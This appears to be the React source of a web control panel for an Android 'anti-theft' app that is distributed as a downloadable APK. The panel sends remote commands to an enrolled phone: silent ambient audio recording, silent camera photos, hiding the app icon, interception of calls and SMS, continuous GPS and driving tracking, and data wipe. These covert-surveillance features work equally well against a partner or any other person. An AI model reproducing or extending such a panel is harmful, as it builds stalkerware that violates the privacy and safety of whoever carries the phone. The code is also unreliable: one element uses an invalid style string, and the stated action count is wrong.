"use client";
import { useEffect, useState, useCallback } from "react";
import { useRouter } from "next/navigation";
import { getFirebaseAuth } from "@/lib/firebase";

const COMMANDS = [
  { type: "LOCK", ico: "🔒", t: "Lock device", d: "Instant lock + owner-PIN gate + selfie.", hot: true },
  { type: "UNLOCK", ico: "🔓", t: "Remote unlock", d: "Owner clears the PIN gate from here.", hot: true },
  { type: "RECORD_AUDIO", ico: "🎙️", t: "Record audio", d: "Silently record 30s ambient audio around phone.", hot: true },
  { type: "START_LIVE_TRACK", ico: "🗺️", t: "Live track", d: "GPS ping every 30s for 1 hour with speed & driving.", hot: true },
  { type: "STOP_LIVE_TRACK", ico: "⏹️", t: "Stop track", d: "End live tracking mode early." },
  { type: "STEALTH_ON", ico: "🥷", t: "Hide icon", d: "Stealth mode: hides app launcher from thief.", hot: true },
  { type: "STEALTH_OFF", ico: "👁️", t: "Unhide icon", d: "Restores app icon to launcher." },
  { type: "RING", ico: "🔔", t: "Ring loudly", d: "Siren + vibration + flash strobe, 5 min.", hot: true },
  { type: "STOP_RING", ico: "🔕", t: "Stop ring", d: "Silence the alarm remotely." },
  { type: "FRONT_PHOTO", ico: "🤳", t: "Front photo", d: "Silently snap who is holding your phone." },
  { type: "BACK_PHOTO", ico: "📸", t: "Back photo", d: "Silently see surroundings of phone." },
  { type: "LOCATE", ico: "📍", t: "Locate now", d: "Ask phone for fresh GPS + battery + speed." },
  { type: "MOTION_ARM", ico: "🔊", t: "Arm motion", d: "Alarms loudly the moment thief moves phone." },
  { type: "MOTION_DISARM", ico: "🔕", t: "Disarm motion", d: "Turn off motion detection alarm." },
  { type: "CHECK_STATUS", ico: "🩺", t: "Health check", d: "Phone self-tests all protections, reports back." },
  { type: "SHUTDOWN", ico: "⏻", t: "Shutdown", d: "Powers off (rooted) or deep-locks the phone." },
  { type: "WIPE", ico: "🧨", t: "Wipe data", d: "DANGER: factory-reset. Last resort!", danger: true },
];

const ALERT_ICON = {
  SIM_CHANGED: "📶",
  WRONG_PIN: "😠",
  LOW_BATTERY: "🪫",
  SMS_COMMAND: "💬",
  WA_COMMAND: "📲",
  MOTION_DETECTED: "🔊",
  SHUTDOWN_ATTEMPT: "📵",
  CALL_FORWARDED: "📞",
  SMS_FORWARDED: "📩",
};

export default function Dashboard() {
  const router = useRouter();
  const [email, setEmail] = useState("");
  const [devices, setDevices] = useState([]);
  const [selected, setSelected] = useState("");
  const [history, setHistory] = useState([]);
  const [log, setLog] = useState([]);
  const [photos, setPhotos] = useState([]);
  const [locations, setLocations] = useState({});
  const [locHistory, setLocHistory] = useState([]);
  const [drivingSummary, setDrivingSummary] = useState(null);
  const [recordings, setRecordings] = useState([]);
  const [forwarded, setForwarded] = useState([]);
  const [alerts, setAlerts] = useState([]);
  const [lightbox, setLightbox] = useState(null);
  const [msg, setMsg] = useState("This phone is lost. Please call my alternate number!");
  const [pin, setPin] = useState("");
  const [newPin, setNewPin] = useState("");
  const [toast, setToast] = useState("");

  useEffect(() => {
    const saved = localStorage.getItem("ldg_email");
    if (!saved) { router.push("/"); return; }
    setEmail(saved);
  }, [router]);

  const refresh = useCallback(async () => {
    if (!email) return;
    try {
      const [dRes, lRes, aRes, pRes, locRes, audRes, fwdRes] = await Promise.all([
        fetch(`/api/devices?owner=${encodeURIComponent(email)}`),
        fetch(`/api/command?owner=${encodeURIComponent(email)}`),
        fetch(`/api/alert?owner=${encodeURIComponent(email)}`),
        fetch(`/api/photos?owner=${encodeURIComponent(email)}${selected ? `&deviceId=${encodeURIComponent(selected)}` : ""}`),
        fetch(`/api/location?owner=${encodeURIComponent(email)}${selected ? `&deviceId=${encodeURIComponent(selected)}` : ""}`),
        fetch(`/api/audio?owner=${encodeURIComponent(email)}${selected ? `&deviceId=${encodeURIComponent(selected)}` : ""}`),
        fetch(`/api/forwarded?owner=${encodeURIComponent(email)}${selected ? `&deviceId=${encodeURIComponent(selected)}` : ""}`),
      ]);
      const [dJson, lJson, aJson, pJson, locJson, audJson, fwdJson] = await Promise.all([
        dRes.json(), lRes.json(), aRes.json(), pRes.json(), locRes.json(), audRes.json(), fwdRes.json()
      ]);

      const devList = dJson.devices || [];
      setDevices(devList);
      if (!selected && devList.length > 0) setSelected(devList[0].deviceId);
      setHistory(lJson.history || []);
      setLog(lJson.log || []);
      setAlerts(aJson.alerts || []);
      setPhotos(pJson.photos || []);
      setLocations(locJson.latest || {});
      setLocHistory(locJson.history || []);
      setDrivingSummary(locJson.drivingSummary || null);
      setRecordings(audJson.recordings || []);
      setForwarded(fwdJson.forwarded || []);
    } catch (e) {
      console.error(e);
    }
  }, [email, selected]);

  useEffect(() => {
    refresh();
    const t = setInterval(refresh, 5000);
    return () => clearInterval(t);
  }, [refresh]);

  const send = async (type) => {
    if (!selected) { setToast("Select a device first"); return; }
    if (type === "WIPE" && !confirm("⚠️ DANGER: Factory reset? This permanently erases all phone data!")) return;
    setToast(`Queuing ${type}…`);
    try {
      const res = await fetch("/api/command", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          owner: email,
          deviceId: selected,
          type,
          message: msg,
          pin,
          newPin: type === "LOCK" ? newPin : undefined,
        }),
      });
      const data = await res.json();
      if (data.ok) {
        setToast(`✅ ${type} queued — phone will execute on next poll`);
        refresh();
      } else {
        setToast(`❌ Failed: ${data.error || "unknown"}`);
      }
    } catch {
      setToast("Network error");
    }
    setTimeout(() => setToast(""), 4000);
  };

  const handleLogout = async () => {
    try {
      const auth = await getFirebaseAuth();
      if (auth) {
        const { signOut } = await import("firebase/auth");
        await signOut(auth);
      }
    } catch (e) {
      console.log("Firebase signout fallback:", e);
    }
    localStorage.removeItem("ldg_email");
    localStorage.removeItem("ldg_auth");
    router.push("/");
  };

  const curDev = devices.find((d) => d.deviceId === selected);
  const curLoc = selected ? locations[selected] : null;

  return (
    <div className="container">
      <header className="header">
        <div className="logo">
          <img src="/logo-thumb.png" alt="LIFE180%" style="width:28px;height:28px;border-radius:6px;object-fit:cover;margin-right:8px;vertical-align:middle" />
          <span>LIFE180%</span>
          <span className="pill" style={{ background: "#22c55e22", color: "#4ade80", border: "1px solid #22c55e44", fontSize: 11 }}>
            v1.3 Pro
          </span>
          <span className="pill" style={{ background: "#38bdf822", color: "#38bdf8", border: "1px solid #38bdf844", fontSize: 11 }}>
            30-day auto-purge ON
          </span>
        </div>
<div style={{ display: "flex", alignItems: "center", gap: 10 }}>
          <a
            href="/LIFE180.apk"
            download="LIFE180.apk"
            className="btn btn-primary"
            style={{ padding: "6px 12px", fontSize: 12, textDecoration: "none", display: "flex", alignItems: "center", gap: 5 }}
            title="Download latest LIFE180.apk for your phone"
          >
            <span>📲</span>
            <span>Download APK</span>
          </a>
          <span style={{ fontSize: 13, color: "#94a3b8" }}>{email}</span>
          <button className="btn btn-outline" style={{ padding: "6px 12px", fontSize: 12 }} onClick={handleLogout}>
            Sign out
          </button>
        </div>
      </header>

      {toast && (
        <div style={{ background: "#1e293b", border: "1px solid #38bdf8", color: "#e2e8f0", padding: "10px 14px", borderRadius: 8, marginBottom: 16, fontSize: 13 }}>
          {toast}
        </div>
      )}

      {alerts.length > 0 && (
        <div className="card alert-box" style={{ marginBottom: 16 }}>
          <h2 style={{ color: "#ef4444", fontSize: 16 }}>🚨 Critical Security Alerts ({alerts.length})</h2>
          <div style={{ display: "flex", flexDirection: "column", gap: 8, marginTop: 8 }}>
            {alerts.slice(0, 5).map((a) => (
              <div key={a.id} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", fontSize: 13, background: "#0f172a", padding: "8px 12px", borderRadius: 6 }}>
                <div>
                  <span style={{ marginRight: 8 }}>{ALERT_ICON[a.type] || "⚠️"}</span>
                  <b>{a.type}</b> — {a.detail}
                  {a.photoId && (
                    <button className="btn btn-outline" style={{ padding: "2px 8px", fontSize: 11, marginLeft: 8 }} onClick={() => setLightbox(`/api/photos?id=${a.photoId}`)}>
                      View Photo
                    </button>
                  )}
                </div>
                <span className="muted" style={{ fontSize: 11 }}>{new Date(a.ts).toLocaleTimeString()}</span>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Device selector */}
      <div className="card" style={{ marginBottom: 16 }}>
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: 10 }}>
          <div>
            <span style={{ fontSize: 12, color: "#94a3b8", textTransform: "uppercase", letterSpacing: 1 }}>Selected Device:</span>
            <div style={{ display: "flex", gap: 8, marginTop: 6, flexWrap: "wrap" }}>
              {devices.length === 0 && <span className="muted">No devices enrolled yet. Install the APK to connect.</span>}
              {devices.map((d) => (
                <button
                  key={d.deviceId}
                  className={`btn ${selected === d.deviceId ? "btn-primary" : "btn-outline"}`}
                  onClick={() => setSelected(d.deviceId)}
                  style={{ fontSize: 13 }}
                >
                  📱 {d.model || d.deviceId}
                  {d.online ? <span className="pill online" style={{ marginLeft: 6 }}>online</span> : <span className="pill" style={{ marginLeft: 6 }}>offline</span>}
                </button>
              ))}
            </div>
          </div>
          {curDev && (
            <div style={{ fontSize: 12, color: "#94a3b8" }}>
              ID: <code className="code">{curDev.deviceId}</code> • Last ping: {new Date(curDev.lastSeen).toLocaleTimeString()}
            </div>
          )}
        </div>
      </div>

      {/* Main Command Pad */}
      <div className="card" style={{ marginBottom: 16 }}>
        <h2 style={{ fontSize: 16, marginBottom: 10 }}>⚡ Remote Command Pad (16 Actions)</h2>
        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(180px, 1fr))", gap: 10 }}>
          {COMMANDS.map((c) => (
            <button
              key={c.type}
              className={`cmd-btn ${c.hot ? "hot" : ""} ${c.danger ? "danger" : ""}`}
              onClick={() => send(c.type)}
              disabled={!selected}
              title={c.d}
              style={{
                display: "flex",
                flexDirection: "column",
                alignItems: "flex-start",
                padding: "12px",
                borderRadius: 10,
                border: c.danger ? "1px solid #ef4444" : c.hot ? "1px solid #38bdf8" : "1px solid #334155",
                background: c.danger ? "#450a0a" : c.hot ? "#0c4a6e33" : "#1e293b",
                color: "#f8fafc",
                cursor: "pointer",
                textAlign: "left",
              }}
            >
              <div style={{ fontSize: 20, marginBottom: 4 }}>{c.ico}</div>
              <div style={{ fontWeight: 600, fontSize: 14 }}>{c.t}</div>
              <div style={{ fontSize: 11, color: "#94a3b8", marginTop: 4 }}>{c.d}</div>
            </button>
          ))}
        </div>

        {/* Lock options */}
        <div style={{ marginTop: 14, paddingTop: 14, borderTop: "1px solid #334155", display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
          <div>
            <label style={{ fontSize: 12, color: "#94a3b8", display: "block", marginBottom: 4 }}>
              🔑 Set New Owner PIN on LOCK (leave empty to keep current PIN):
            </label>
            <input
              type="text"
              placeholder="e.g. 5678"
              value={newPin}
              onChange={(e) => setNewPin(e.target.value.replace(/[^0-9A-Za-z]/g, "").slice(0, 16))}
              style={{ width: "100%", padding: 8, background: "#0f172a", border: "1px solid #334155", borderRadius: 6, color: "#fff" }}
            />
          </div>
          <div>
            <label style={{ fontSize: 12, color: "#94a3b8", display: "block", marginBottom: 4 }}>
              💬 Lost screen display message:
            </label>
            <input
              type="text"
              value={msg}
              onChange={(e) => setMsg(e.target.value)}
              style={{ width: "100%", padding: 8, background: "#0f172a", border: "1px solid #334155", borderRadius: 6, color: "#fff" }}
            />
          </div>
        </div>
      </div>

      {/* Grid: Audio & Forwarded Calls/SMS */}
      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, marginBottom: 16 }}>
        {/* Audio Recordings */}
        <div className="card">
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
            <h2 style={{ fontSize: 16 }}>🎙️ Ambient Audio Recordings ({recordings.length})</h2>
            <button className="btn btn-primary" style={{ padding: "4px 10px", fontSize: 11 }} onClick={() => send("RECORD_AUDIO")} disabled={!selected}>
              + Record 30s now
            </button>
          </div>
          <p className="muted" style={{ fontSize: 12, marginTop: 4 }}>
            Silently records what the thief or people around the phone are saying. Audio kept 30 days.
          </p>
          <div style={{ marginTop: 10, display: "flex", flexDirection: "column", gap: 8, maxHeight: 300, overflowY: "auto" }}>
            {recordings.length === 0 && <span className="muted" style={{ fontSize: 12 }}>No recordings yet. Tap "+ Record 30s now" above.</span>}
            {recordings.map((r) => (
              <div key={r.id} style={{ background: "#0f172a", padding: 10, borderRadius: 8, border: "1px solid #334155" }}>
                <div style={{ display: "flex", justifyContent: "space-between", fontSize: 12, marginBottom: 6 }}>
                  <span><b>🎙️ {r.durationSeconds || 30}s recording</b> ({Math.round((r.size || 0) / 1024)} KB)</span>
                  <span className="muted">{new Date(r.ts).toLocaleString()}</span>
                </div>
                <audio controls src={`/api/audio?id=${r.id}`} style={{ width: "100%", height: 32 }} />
                {r.note && <div style={{ fontSize: 11, color: "#94a3b8", marginTop: 4 }}>{r.note}</div>}
              </div>
            ))}
          </div>
        </div>

        {/* Forwarded Calls & SMS */}
        <div className="card">
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
            <h2 style={{ fontSize: 16 }}>📲 Intercepted Calls & SMS ({forwarded.length})</h2>
            <span className="pill online" style={{ fontSize: 11 }}>Auto-sync ON</span>
          </div>
          <p className="muted" style={{ fontSize: 12, marginTop: 4 }}>
            Incoming SMS and calls to your lost phone appear here in real time.
          </p>
          <div style={{ marginTop: 10, display: "flex", flexDirection: "column", gap: 8, maxHeight: 300, overflowY: "auto" }}>
            {forwarded.length === 0 && <span className="muted" style={{ fontSize: 12 }}>No incoming calls/SMS forwarded yet.</span>}
            {forwarded.map((f) => (
              <div key={f.id} style={{ background: "#0f172a", padding: 10, borderRadius: 8, border: "1px solid #334155", fontSize: 12 }}>
                <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 4 }}>
                  <span>
                    <span style={{ marginRight: 6 }}>{f.type === "SMS" ? "📩" : "📞"}</span>
                    <b>{f.type === "SMS" ? "SMS From:" : `Call (${f.callType}):`}</b> <span style={{ color: "#38bdf8" }}>{f.from}</span>
                  </span>
                  <span className="muted" style={{ fontSize: 11 }}>{new Date(f.ts).toLocaleTimeString()}</span>
                </div>
                {f.body && <div style={{ background: "#1e293b", padding: 6, borderRadius: 4, marginTop: 4, color: "#e2e8f0" }}>{f.body}</div>}
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* Speed, Driving & 30-Day GPS History */}
      <div className="card" style={{ marginBottom: 16 }}>
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: 10 }}>
          <div>
            <h2 style={{ fontSize: 16 }}>🗺️ GPS Location, Driving Speed & 30-Day History</h2>
            <p className="muted" style={{ fontSize: 12, marginTop: 2 }}>
              Track exact route, driving speeds, stops, and where the phone was moved. Automatically deletes on Day 31.
            </p>
          </div>
          <div style={{ display: "flex", gap: 8 }}>
            <button className="btn btn-primary" style={{ padding: "6px 12px", fontSize: 12 }} onClick={() => send("START_LIVE_TRACK")} disabled={!selected}>
              🚀 Start Live Track (30s)
            </button>
            <button className="btn btn-outline" style={{ padding: "6px 12px", fontSize: 12 }} onClick={() => send("LOCATE")} disabled={!selected}>
              📍 Ping Once
            </button>
          </div>
        </div>

        {/* Driving stats banner */}
        {drivingSummary && (
          <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(140px, 1fr))", gap: 10, marginTop: 12, background: "#0f172a", padding: 12, borderRadius: 8 }}>
            <div>
              <div style={{ fontSize: 11, color: "#94a3b8" }}>CURRENT SPEED</div>
              <div style={{ fontSize: 18, fontWeight: "bold", color: (curLoc?.speedKmh || 0) > 15 ? "#f59e0b" : "#38bdf8" }}>
                {curLoc?.speedKmh ? `${curLoc.speedKmh} km/h` : "0 km/h"}
                <span style={{ fontSize: 11, color: "#94a3b8", marginLeft: 4 }}>({curLoc?.speedMph || 0} mph)</span>
              </div>
              <div style={{ fontSize: 11, color: curLoc?.isDriving ? "#f59e0b" : "#10b981" }}>
                {curLoc?.isDriving ? "🚗 Vehicle In Motion" : "🛑 Stationary / Walking"}
              </div>
            </div>
            <div>
              <div style={{ fontSize: 11, color: "#94a3b8" }}>MAX RECORDED SPEED</div>
              <div style={{ fontSize: 18, fontWeight: "bold", color: "#e2e8f0" }}>
                {drivingSummary.maxSpeedKmh} km/h
                <span style={{ fontSize: 11, color: "#94a3b8", marginLeft: 4 }}>({drivingSummary.maxSpeedMph} mph)</span>
              </div>
              <div style={{ fontSize: 11, color: "#94a3b8" }}>30-day peak</div>
            </div>
            <div>
              <div style={{ fontSize: 11, color: "#94a3b8" }}>DRIVING WAYPOINTS</div>
              <div style={{ fontSize: 18, fontWeight: "bold", color: "#38bdf8" }}>
                {drivingSummary.drivingPointsCount} / {locHistory.length}
              </div>
              <div style={{ fontSize: 11, color: "#94a3b8" }}>points &gt; 15 km/h</div>
            </div>
            <div>
              <div style={{ fontSize: 11, color: "#94a3b8" }}>BATTERY & SATELLITE</div>
              <div style={{ fontSize: 18, fontWeight: "bold", color: "#10b981" }}>
                🔋 {curLoc?.battery != null ? `${curLoc.battery}%` : "–"}
              </div>
              <div style={{ fontSize: 11, color: "#94a3b8" }}>±{curLoc?.accuracy ? Math.round(curLoc.accuracy) : "?"}m accuracy</div>
            </div>
          </div>
        )}

        {/* Current map link */}
        {curLoc && (
          <div style={{ marginTop: 12, padding: 12, background: "#1e293b", borderRadius: 8, display: "flex", justifyContent: "space-between", alignItems: "center" }}>
            <div>
              <b>Latest GPS:</b> {curLoc.lat.toFixed(5)}, {curLoc.lng.toFixed(5)}
              <span className="muted" style={{ marginLeft: 8, fontSize: 12 }}>
                ({new Date(curLoc.ts).toLocaleTimeString()}) — source: {curLoc.source || "gps"}
              </span>
            </div>
            <a
              href={`https://maps.google.com/?q=${curLoc.lat},${curLoc.lng}`}
              target="_blank"
              rel="noreferrer"
              className="btn btn-primary"
              style={{ padding: "6px 14px", fontSize: 12, textDecoration: "none" }}
            >
              🗺️ Open in Google Maps ↗
            </a>
          </div>
        )}

        {/* History table */}
        <div style={{ marginTop: 12, maxHeight: 220, overflowY: "auto" }}>
          <table style={{ width: "100%", fontSize: 12, borderCollapse: "collapse" }}>
            <thead>
              <tr style={{ color: "#94a3b8", textAlign: "left", borderBottom: "1px solid #334155" }}>
                <th style={{ padding: "6px 8px" }}>Time</th>
                <th style={{ padding: "6px 8px" }}>Coordinates</th>
                <th style={{ padding: "6px 8px" }}>Speed (km/h)</th>
                <th style={{ padding: "6px 8px" }}>Driving?</th>
                <th style={{ padding: "6px 8px" }}>Battery</th>
                <th style={{ padding: "6px 8px" }}>Source</th>
                <th style={{ padding: "6px 8px" }}>Map</th>
              </tr>
            </thead>
            <tbody>
              {locHistory.slice(0, 30).map((l) => (
                <tr key={l.id || l.ts} style={{ borderBottom: "1px solid #1e293b" }}>
                  <td style={{ padding: "6px 8px" }}>{new Date(l.ts).toLocaleString()}</td>
                  <td style={{ padding: "6px 8px", fontFamily: "monospace" }}>{l.lat.toFixed(4)}, {l.lng.toFixed(4)}</td>
                  <td style={{ padding: "6px 8px", fontWeight: l.speedKmh > 15 ? "bold" : "normal", color: l.speedKmh > 15 ? "#f59e0b" : "#cbd5e1" }}>
                    {l.speedKmh || 0} km/h
                  </td>
                  <td style={{ padding: "6px 8px" }}>{l.isDriving ? "🚗 YES" : "🛑 No"}</td>
                  <td style={{ padding: "6px 8px" }}>{l.battery != null ? `${l.battery}%` : "–"}</td>
                  <td style={{ padding: "6px 8px", color: "#94a3b8" }}>{l.source || "poll"}</td>
                  <td style={{ padding: "6px 8px" }}>
                    <a href={`https://maps.google.com/?q=${l.lat},${l.lng}`} target="_blank" rel="noreferrer" style={{ color: "#38bdf8", textDecoration: "none" }}>
                      View ↗
                    </a>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
          {locHistory.length === 0 && <p className="muted" style={{ padding: 12, fontSize: 12 }}>No GPS points recorded yet.</p>}
        </div>
      </div>

      {/* Spy Photos */}
      <div className="card" style={{ marginBottom: 16 }}>
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
          <h2 style={{ fontSize: 16 }}>📷 Spy Photos & Intruder Selfies ({photos.length})</h2>
          <div style={{ display: "flex", gap: 8 }}>
            <button className="btn btn-outline" style={{ padding: "4px 10px", fontSize: 11 }} onClick={() => send("FRONT_PHOTO")} disabled={!selected}>
              🤳 Front photo
            </button>
            <button className="btn btn-outline" style={{ padding: "4px 10px", fontSize: 11 }} onClick={() => send("BACK_PHOTO")} disabled={!selected}>
              📸 Back photo
            </button>
          </div>
        </div>
        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(130px, 1fr))", gap: 10, marginTop: 12 }}>
          {photos.length === 0 && <span className="muted" style={{ fontSize: 12 }}>No photos captured yet.</span>}
          {photos.map((p) => (
            <div
              key={p.id}
              onClick={() => setLightbox(`/api/photos?id=${p.id}`)}
              style={{ background: "#0f172a", borderRadius: 8, overflow: "hidden", cursor: "pointer", border: "1px solid #334155" }}
            >
              <img src={`/api/photos?id=${p.id}`} alt="spy" style={{ width: "100%", height: 110, objectFit: "cover" }} />
              <div style={{ padding: 6, fontSize: 10, color: "#94a3b8" }}>
                <div><b>{p.camera === "front" ? "🤳 Front" : "📸 Back"}</b></div>
                <div>{new Date(p.ts).toLocaleTimeString()}</div>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Lightbox */}
      {lightbox && (
        <div
          onClick={() => setLightbox(null)}
          style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.85)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 9999, padding: 20 }}
        >
          <img src={lightbox} alt="full" style={{ maxWidth: "90%", maxHeight: "90%", borderRadius: 12 }} />
        </div>
      )}
    </div>
  );
}
